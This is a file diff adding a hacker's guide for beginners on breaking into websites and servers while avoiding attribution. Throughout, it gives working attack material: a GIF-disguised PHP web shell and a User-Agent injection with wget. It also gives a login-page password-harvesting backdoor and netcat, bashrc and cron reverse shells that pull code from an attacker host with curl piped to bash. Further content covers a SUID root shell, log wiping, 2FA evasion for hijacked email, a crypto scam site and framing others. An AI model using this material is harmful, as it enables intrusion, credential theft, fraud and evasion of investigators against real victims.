@@ -1,0 +1,305 @@
++------------------------------------------------------------------------------+ 
+---[Tips & Tricks For Noobs]--- 
+---[Author: Booda]--- 
+--- [ RAAS Generator: https://github.com/leonv024/RAASNet
+--- [ Easy Phishing: https://getgophish.com/
+
+You don't start hacking well. You start hacking stuff, and then gradually you get better. That is why the most valuable virtues is persistence and dedication. The best way to learn to hack is by hacking and the same can be said for learning to code. JUST DO IT!
+
+Use open-source and publicly/freely available scripts (tools) in your hacks limit using your own scripts and if you do it’s better to open source them so more people use them to make it harder to pin on just you. Using freely available tools that can be found on GitHub makes your digital foot print harder to track and it makes attribution claims a lot harder as well. Creating new domains, emails, usernames, crypto wallet addresses, registering new VPS, and changing the way you normally conduct a hack makes your digital footprint a lot harder to track.
+
+Learn lateral movement and spearfishing. At a minimum you'll want a windows server as a domain controller, another normal domain joined windows vm, and a dev machine with visual studio for compiling and modifying tools. Try out meterpreter, mimikatz, bloodhound, kerberoasting, smb relaying, making an office document with macros that spawn meterpreter or another RAT, psexec and other lateral movement techniques. At first you can disable windows defender, but then try everything with it enabled (but with automatic sample submission off). Once you're comfortable with all that, you're ready to hack 99% of companies. Some things that will help you a lot to learn at some point are being comfortable with bash and cmd.exe, basic proficiency in powershell, python, and javascript, knowledge of kerberos and active directory.
+
+---[ - http://osintframework.com/
+---[ - https://start.me/p/b5Aow7/asint_collection
+  
+The use of malware has many use cases, from phishing, attacking specific targets and more, if you wish to go get some malware then go to > https://github.com/ytisf/theZoo. Refactor the code (if possible) to strip off the signatures. 
+
+The two most important skills for practical hacking are phishing and social engineering to get initial access, and then being able to climb and move through the windows domains. It’s best to be proficient with powershell.
+
+Remember hacking is illegal and if caught you can serve some hefty jail time. Feds don't really care if you break into some small time website and deface it, steal their emails or leak their database or use the server as storage. However if they can easily bust you with limited effort and resources then they will. So it’s important to stay safe and protect yourself.
+
+My way of staying safe will be different from yours but this is how I stay safe while hacking and I suggest you either use my method or adopt a better one. Always do your hacks inside of a VM (whonix), you want to be able to completely destroy your VM after each hack (destroying evidence) and you want to keep your normal computer use separate from your hacking so confine all your hacks in a VM and don't confuse the two.
+
+1) Your host OS should be a nix* based OS, stay away from windows (I hate windows, too transparent).
+
+2) On your host make sure to use FDE (Full Disk Encryption) with a strong and complicated passphrase.
+
+3) Download a virtualiser, mine is VirtualBox and then download whonix.
+
+4) Download veracrypt and create a 25gb or so (your choice) container.
+
+5) Install whonix into /media/veracrypt1 this way your entire VM is fully encrypted, whonix by default doesn't allow for FDE.
+
+6) Hacking straight from whonix isn't the best idea as Tor is slow and inefficient for hacking. Rent a VPS and bring in a tarball of the different scripts (tools) you’ll be using. Using Tor you cant receive connect back shells so a VPS is good for this.
+
+Yes you can use a VPN, granted you use fake credentials and pay anonymously.
+
+Run scripts against targets in an anonymous VPS. Connect to VPS over Tor. Pay for the VPS with BTC, Monero etc. To get free BTC so it cant be traced back to you, set up a scam website (.onion) like “hitman for hire” or something like that, farm your crypto, then use it to rent your VPS (you can also use a bounce box). This way it makes it harder to trace it back to you. It’s best to perform any and all your hacks in a whonix VM, ssh to VPS then run scripts, this is because Tor is too slow, and nmap and other tools make thousands of requests and doing that over Tor is too ineffective and slow, so using a VPS will give a faster connection to your targets. You cant receive connect back shells using Tor. Don't forget that all Tor exit nodes are all blacklisted so using a VPS will prevent the possibility of being denied connection to the target box if they block Tor exit nodes. After each hack make sure to dispose of your VPS and spin up a new one for your next hack.
+  
+1) Repeatedly scan IPs/subdomains, whois lookups on every single IP address you find and domain names, and reverse whois lookups using google dorks to find all the IP addresses space and domain names associated with the target. Use nmap to find what ports are open and the services that are running on those ports. You can use shodan and Censys to do this passively. 
+  
+--[Reverse Whois Lookups Using Google Dorks]-- 
+Whois a target and then find the address in the whois then use that as a string to perform a reverse whois lookup.
+
+1) "Address" inurl:ip-address-lookup 
+2) "Address" inurl:domaintools 
+  
+Repeatedly scan IP ranges, perform whois lookups/reverse whois lookups on every single IP address you find, enumerate to find more subdomains and the IP addresses. Run vulnerability analysis scans on all the IPs/Domains/Subdomains you find. Know when to perform passive recon over active.
+  
+The majority of your time should be spent performing recon/osint, its a key skill to have. Content discovery is king. Know when to passively and actively scan your target.
+  
+---[Vulnerability Analysis]--- 
+
+1) Scan the targets CMS to find versions and if anything is out of date and vulnerable. Locate as many CVEs as possible. If you cant find the CMS version through the use of tools, then view the page source and keyword search for “version”, “CMS Name”, etc.
+  
+2) Scan all the IPs, domains & subdomains to find vulns. 
+  
+3) Locate admin panels, try SQLi bypass, find emails and check if they have been breached (pwned). 
+  
+4) Check the site for file uploads, disable javascript and try to upload shells, disabling Javascript may enable you to bypass file upload filters. Is there a user login? Create an account or sign into someone elses, once you're an authenticated user file uploads dont usually have filters on them. Once you have become an authenticated user perform more scans and repeat the first process but this time your behind the firewall so you'll find more vulns, use ZAP proxy for this.
+  
+5) Is the server using a cloudflare plugin? Enumerate the DNS and locate the servers IP, add the servers IP to your /etc/hosts/ so when you perform scans you bypass cloudflare and directly interact with the target server. (This only works if the DNS is misconfigured). (Tor ignores local /etc/hosts). Check subdomains for cloudflare, some sites only have cloudflare on the domain and not the subdomains, if so then scan the subdomains as cloudflare wont block you on those subdomains.
+  
+6) Vuln scan all the IP ranges with nmap/nikto/masscan, make sure to utilise the nmap scripting engine (nse). Other CMS vuln scanners are great too. Scan subdomains also. 
+  
+7) Locate each service that your target is running and try and locate any misconfigurations and try to find CVE’s and public exploits (exploit-db).
+  
+8) Locate services that arent publicly listed, in this case as the service isnt publicly listed it might not require authentication. Some admins believe that if something isnt publicly listed anywhere then they dont need to both to protect that service, so enumerate, enumerate, enumerate and enumerate.
+  
+9) Try and find git.target.com to read their source codes. Find APIs, passwords and any sensitive information. 
+  
+10) Does the target have any low hanging fruits? Anonymous ftp login with read and write permissions, database server with a blank password (mysql -u root -h <target>)? Brute-Force the SSH, root user? no key?. 
+  
+11) Check if the target is running any IOT devices, maybe they still have their default factory default password (admin:admin). 
+  
+12) Locate any CVEs with public exploits. 
+  
+13) Is the webserver running on a non standard port? Are there any subdomains such as dev.target.com, test.target.com, git.target.com, etc. Subdomains tend to be more vuln than the domain so enumerate your subs.
+  
+14) Run Whatweb to find the technology that the target is running on their site, you can also use wappalyzer for this. 
+  
+15) Find any and all files that are on the site and server, an example would be does the server have a backup.zip file? use google dorks to find PDFS, Docs, XMLs, etc. Finding company files is a great way to attach malware and use them in a phishing attack as the docs you're sending are company docs so they're more likely to be trusted by the end user. 
+  
+16) Troll linkedin and find non tech savy employees, these are more likely targets in phishing campaigns. Maybe they have too much access on the target network? 
+  
+17) Test your exploits on other targets that run similar software to your target so you can weed out any and all mistakes before exploiting your main target. Locate relevant files, and google dork other sites running similar software and test out exploits, if they work on other random targets, practise a bit, then return to the main target and exploit them. Maybe the software running on your target you can't see the source... but you can on other targets or you can exploit them easier and then you can view the source, identify vulns, then check for the same vulns on your target. 
+  
+18) In your shell code start it with: GIF8 jfjfjrjfhchdisjdb<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>. This will now be read as an image file. This is incase the upload filter reads file contents, it will be read as an image (Gif) file. To double check this pull up a terminal and use the command ‘file shell.php’. In some cases you can get a shell on a box by uploading a shell as a user agent > User-Agent: <?system('wget  http://domain.com/shell.txt -O shell.php');?> and then upload php code into that just made file. Same can be said for RCE. When uploading shells to a box its important to make the file look  legitimate, so once you upload a shell, rename it to blend in with the rest of the server and also change the time stamps. Reverse shells, web shells and CLI shells (weevely) are all great and the one you choose will depend on your preference.
+  
+19) Burp allows you to intercept requests. For example, I log in as a user and burp intercepts the request to change the username to ‘admin’ and see if the login is allowed. These are just a few examples that have worked for me in the past, and depend on how tough the target is. When uploading file.php, I use Burp to intercept the request, change the content type to file/doc, image/jpeg, etc, then pass the request to the server. Sometimes this is all you need to bypass the filter. Change content type from application/file.php to file/docx.
+  
+20) Don't forget to use Google, Google dorks, Google services and software that runs on your target. Did you find an IOT? Google finds the default password in the manual pages and makes it easier to understand how those technologies work. 
+  
+21) I understand that there is no vuln today, but there may be tomorrow, and tomorrow an admin can set up a development subdomain or run a development server. Scout every day to check for changes to see what can be exploited. 
+  
+22) Google software version numbers where you can find and find public exploits and articles describing the bugs found. 
+  
+23) Once inside the box, make sure to change the timestamp of all files uploaded to the box and delete the activity from the log files (error/access logs). 
+  
+24) Is the server hosted by the target? Switch to the internal network. Does the target server host more than one site?
+  
+25) Find the server access log and find the admins IP. Is it static? DOS the ip so the admin cant login and mitigate the attack. Same can be done for the exploitation phase. DOS the domain while exploiting the subdomain, this is a tactic to distract the admin while you exploit.
+  
+26) Fuzzing end points of after login some of the administrator pages could be accessible without login, you dont always need to login as admin to access admin pages in the panel. If so then will that page have a file upload? most admin panels allow for php, asp and jsp file uploads. Don’t forget to delete the first shell after uploading a second one through the first, you’re trying to hide in plain sight. Name your shell to something that makes sense to the environment that you’re in.
+
+27) Once you have popped the box, if you find that the sites database has encrypted all the passwords and you cant be bothered cracking them, then its worth remembering that with 2 lines of php code you can back door the login page. 
+
+---[ - Code (PHP)
+ 
+file_put_contents("wp-includes/.user.php", "WP": " . $_POST['log']
+			 “ : “ . $_POST[‘pwd’] . “\n”, FILE_APPEND);
+
+---[ - End of Code
+
+Change ‘log’ and wp-includes/.user.php to the appropriate names once your on the box. 
+
+28) To login to other peoples email accounts you'll need to trick google and outlook, and others that you're the actual user in order for google not to force 2fa on your login attempt to the victim, so to achieve this find the users user agent in the database you have just popped, take that user agent string and use it when you login as the user, this way google wont send an email to the user "new device signin detected, is this you?", after that connect your VPN to the same city or country that the user lives in, once you've done this then you should be able to login as the user without worrying about google forcing 2fa on you and alerting the user that someone has made a login attempt. 
+
+29) I often find that most of the vulns i find are past a login form, try to steal or create an account then use the zap intercept proxy to scan for vulns past a login form, this way you're behind the firewall and are more likely to find vulns. 
+
+30) If you’re using the Tor browser to browse around your shell, or to start pen testing a website then you’ll find that google dorking doesnt work too well while using Tor, it’ll always think that you’re a bot (as Tor exit nodes are all blacklisted), luckily the bing search engine allows for google dorks and doesnt care if you’re using a proxy, VPN or Tor so it wont ask you to complete captchas. Use bing to get around the problem of always having to complete google captchas whilst using Tor.
+
+31) Dir brute forcing, finding possible unlinked dirs on the target. Dont stop brute forcing after the top level domain, brute force past to find possible 200 status code such as https://domain.com/admin/scan-here (dir buster, gobuster and use seclists on github).
+
+32) Once you have access to someones id_rsa key, simply save the private key in a text file, call it whatever you want, set the file permissions > chmod 600 <file> and then simply ‘ssh -i file_id_rsa user@host’ and then try to connect.
+
+33) Ideally you would be looking for opportunities to gain access to a user account. SSH keys stored at /home/user/.ssh are often an ideal way to do this using the above method. In some cases it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like Dirty c0w[1] or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, make sure SSH is open to do this use ‘nmap -sC -sV -A <host>’.
+
+[1] https://dirtycow.ninja/
+
+34) Shells are a great way of getting RCE on a box and a nice little backdoor so we don't have to keep sploiting the box every time to gain access back to the box, and if the vuln you sploited has been patched then a backdoor is essential for persistence.
+
+Shells.
+
+---[ Code (PHP)
+
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?> 
+(use <pre> tags to get propper output formatting of the commands you run).
+---[ End of code
+
+To use this shell after you’ve uploaded it to the box do: backdoor.php?cmd=ls.
+
+This nice little php shell is simple yet effective but not very usable as you need to enter commands in the URL each time you want to do something, this can take forever! This shell may also return errors depending on the box’s security configuration, example: “Warning: shell_exec() has been disabled for security reasons”. Go to GitHub and find yourself a precooked shell instead, such as weevely. For a better performing shell use WSO shells found on github or set up a reverse shell using weevely for better performance.
+
+Reverse shells. 
+
+WARNING! When using reverse shells you need to use a local IP so you cant use a VPN or Tor. It’s not advised that you use your own box for this, instead use either a bounce box or a disposable VPS.
+
+A reverse shell allows for RCE and allows for a more functional and useable shell. Reverse shells are a great way to bypass firewalls (by default firewalls are configured to deny incoming traffic and allow outgoing traffic, the listener on your bounce box makes an outbound connection and your hacked box connects back to the outbound connection and thus gives us RCE). The tool you’ll want to use is netcat (nc), reason being is that netcat is on almost every linux box and allows for connect back shells. For windows you’ll need netcat.exe. 
+
+On your bounce box do: nc -lvnp <port> (change port number to your desired port, keep ports below 1000 for better firewall/IDS evasion).
+
+Now on the hacked box do: nc <bounce box IP> <port specified by you> -e (remove if doesn't work) /bin/bash.
+
+Now you’re connected but we have a problem, we have what's called a non-interactive shell, this isn't very usable or stable so we need to stabilise the shell and make it interactive.
+
+Stabilise the shell:
+
+Do: python -c 'import pty;pty.spawn("/bin/bash")', this will give you: user@host:~$ which we’re all familiar with. Now we want terminal commands like clear, etc. Do: export TERM=xterm. Ctrl + z
+
+Now background your shell using ctrl + z. Now we want access to tab completion, arrow key use and ctrl + c, etc. Do: stty raw -echo. Then nc -lvnp <port> to get back onto your box.
+
+Now your shell will feel more comfortable, usable and more importantly stable. The shell should feel and behave just like your local shell.
+
+Bind shells.
+
+Bind shells are far more stable and you can encrypt the connection using OpenSSL. The difference between a reverse shell and a bind shell apart from stability is that with a reverse shell your bounce box starts a listener and you connect back to that listener with the hacked box, but with a bind shell you start the listener on the hacked box and connect back from your bounce box.
+
+On the newly hacked box do: nc -lvnp <port> -e /bin/bash. Now on your bounce box do: nc <hacked box local IP> <port>.
+
+If you would like to use text editors such as vim in the shell then we’ll need to set the terminal size manually as vim takes up the whole terminal to use, to do this we need to set the size of columns and rows. To find the rows and cols do: stty -a, the output should look something like this: rows 57; columns 213. Now in your shell do: stty rows <#rows> & stty cols <#cols>. This will change the registered width and height of the terminal, thus allowing programs such as vim which rely on such information being accurate to correctly open.
+ 
+If you want to encrypt the connection using a bind shell then you’ll need to use socat instead of netcat.
+
+Socat: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true
+
+Try out > https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php
+
+35) Using google if a site is taking too long to load or the site is down then do: cache:https://www.domain.com.
+
+36) There are many ways to get a reverse shell, go to the pentest monkey reverse shell cheat sheet for a more comprehensive list. 
+
+37) Internal networks tend to have weak credentials, so brute-forcing them will often work. 
+
+38) To test SQLi on login forms give the username something generic like ‘admin’ and the same goes for the password, then fire up burp suite and captcha the login request, copy + paste it into a file and then do: sqlmap -r file -p username and this will test for SQLi in the login form in the background whilst you do the rest of your recon.
+
+39) After bruteforcing look for other status codes indicating you are denied or require auth then append list there to test for misconfigured access control. Do: http://www.domain.com/admin/[bruteforce here now]
+
+40) Data Driven Assessment (diminishing return FTW). Do:
+
+1. Visit the search, registration, contact, password reset, and comment forms and hit them with your polyglot strings
+2. Scan those specific functions with Burp’s built-in scanner
+3. Check your cookie, log out, check cookie, log in, check cookie. Submit old
+cookie, see if access.
+4. Perform user enumeration checks on login, registration, and password
+reset.
+5. Do a reset and see if; the password comes plaintext, uses a URL based
+token, is predictable, can be used multiple times, or logs you in
+automatically
+6. Find numeric account identifiers anywhere in URLs and rotate them for
+context change
+7. Find the security-sensitive function(s) or files and see if vulnerable to
+non-auth browsing (idors), lower-auth browsing, CSRF, CSRF protection
+bypass, and see if they can be done over HTTP.
+8. Directory brute for top short list on SecLists
+9. Check upload functions for alternate file types that can execute code (xss
+or php/etc/etc)
+
+41) ---[ Discovery - 
+
+    1. ^.domain.com scope is your friend.
+    2. Find domains via Google and Bing.
+    3. Can be automated well via recon-ng and other tools.
+    4. Port scan for obscure web servers or services (on all domains).
+    5. Functionality changes or re-designs of the site.
+    6. Mobile websites, switch your user-agent to get the mobile view to render.
+    7. New mobile app versions.
+    8. Searching parent company by trademark or privacy policy.
+
+42) ---[ File Upload - 
+
+    1. Upload unexpected file format to achieve code exec (swf, html, php, php3, aspx, ++) Web shell, if you can upload a html doc, then on that page you need to use an upload function, this way you bypass the upload filter assuming you managed to get at least html through.
+    2. Execute XSS via same types of files. Images as well!
+    3. Attack the parser to DoS the site or XSS via storing payloads in metadata or file header
+    4. Bypass security zones and store malware on target site via file polyglots.
+    5. Injecting reverse shells into images may work to get code exec on the box.
+
+43) It’s common to see mobile apps not applying encryption to the files that store PII.
+
+Common places to find PII unencrypted:
+    1. - Phone system logs (avail to all apps).
+    2. - webkit cache (cache.db).
+    3. - plists, dbs, etc.
+    4. - hardcoded in the binary.
+
+44) File MetaData. A lot of information about employees and their systems can be found in metadata of files the company has published. Useful tools for finding
+files on the company's website and extracting the metadata is that of exiftool.
+
+Others:
+https://github.com/laramies/metagoofil
+
+45) Before publishing any documents, pictures or files that you created on your host/vm use a tool called mat2. Do: ./mat2 file.txt. This will remove any metadata that could lead back to you.
+
+46) After a hack has finished it is often a good idea to share your backdoor access to the box with a few other people, this way the police investigation will be made harder and if you covered your tracks properly and someone accesses your backdoor without any protection then they’ll take the fall for the hack and not you. Higher chance anyways, especially if the authorities are desperate. 
+
+47) Perform recon on a site, note admin cp’s, registration pages, and anything else of interest, first try to blast the login form with SQLi, then register an account, most vulns live behind login forms, use ZAP’s intercept proxy and scan past the login form, look for vulns and then exploit what you find. The likely chance of their being vulns behind a login form is greater than the chance of vulns being on the public facing site it self.
+
+48) If you change the MAC address on your router and then unplug the power from your cable modem and then re-plug it back in 30-60secs later and have a different MAC address for your router then the ISP will reprovision you a new IP address. 
+
+49) SSH backdoor. The ssh backdoor essentially consists of leaving your ssh keys in the user’s home directory. Usually the user would be root as it’s the user with the highest privileges. 
+
+Do: ssh-keygen on the target and go to /root/.ssh/ and leave the public key there, then put the private key on your machine, set the right permissions Do: chmod 600 id_rsa. 
+
+To connect Do: ssh -i id_rsa user@host to connect to the target via the newly created SSH backdoor. 
+
+NOTE: Generating new keys overwrites the current ones by default. However, renaming the keys saves them to different files and won’t overwrite the current  existing keys.
+
+50) Another easy backdoor is the previously mentioned PHP backdoor. On the Linux box go to /var/www/html/ and add /backdoor.php (path will vary box to box but go to /var/www/) (don’t call it backdoor). To find shells to go GitHub and search for them or use weevely (recommended).
+51) If a user has bash as their login shell, the ".bashrc" file in their home directory is executed when an interactive session is launched. So If you know any users that log on to their system quite often, you could simply run this command to include your reverse shell into their ".bashrc".
+
+DO: echo 'bash -i >& /dev/tcp/<IP>/port 0>&1' >> ~/.bashrc
+NOTE: One important thing is to always have your netcat listener ready as you don't know when your user will log on.
+52) CronJob Backdoor. A cronjob is a task that you set to run every hr, minute, day and or month. 
+
+On your remote machine Do: python3 -m http.server 8080. This will set your localhost as the web server which will be used to serve the shell to the target machine.
+
+Create the shell. 
+
+File Contents:
+--- - [ BASH
+#!/bin/bash
+bash -i >& /dev/tcp/<IP>/port 0>&1
+--- - [ END OF BASH
+
+Set the cronjob, Do: * *    * * *   root    curl http://<IP>:8080/shell | bash.
+
+Set your listener, Do: nc -lnvp <port>.
+
+Refer to: https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c
+
+53) SUID backdoors. Make sure to compile locally and then upload.
+
+Shell:
+echo 'int main() { setresuid(0,0,0); system("/bin/sh"); }' > privshell.c
+gcc -o privshell privshell.c
+rm privshell.c
+chown root:root privshell
+chmod u+s privshell
+Refer to: https://www.linuxnix.com/suid-set-suid-linuxunix/
+
+Further Reading: https://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html
+
+Further Reading: https://github.com/zephrax/linux-pam-backdoor
+
+54) If you try entering the username admin and fill in the other form fields with fake information, you'll see we get the error An account with this username already exists. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches.
+
+Using ffuf (fuzzer) do:
+
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://site.com/signup -mr "username already exists"
+
+If you’re wondering how we get “username=FUZZ&email=x&password=x&cpassword=x” simply fire up burpsuite and go through signup again but this time with your burp proxy turned on now you’ll see the above and simply replace the username with FUZZ to tell ffuf to fuzz specically there.
+
+For common CMS’s such as a wordpress instance use wpscan for username enumeration however for unique and verbose CMS’s then a fuzzer will be needed. Fuzzing is very useful and can be used t fuzz end points and you may discover content you shouldn’t. An example here would be to do: site.com/admin/FUZZ you may discover /admin/upload/. This page is suppose to require authentication in order to access however if its misconfigured then you may be able to access the upload page and get a shell on the box without auth.
+
++------------------------------------------------------------------------------+
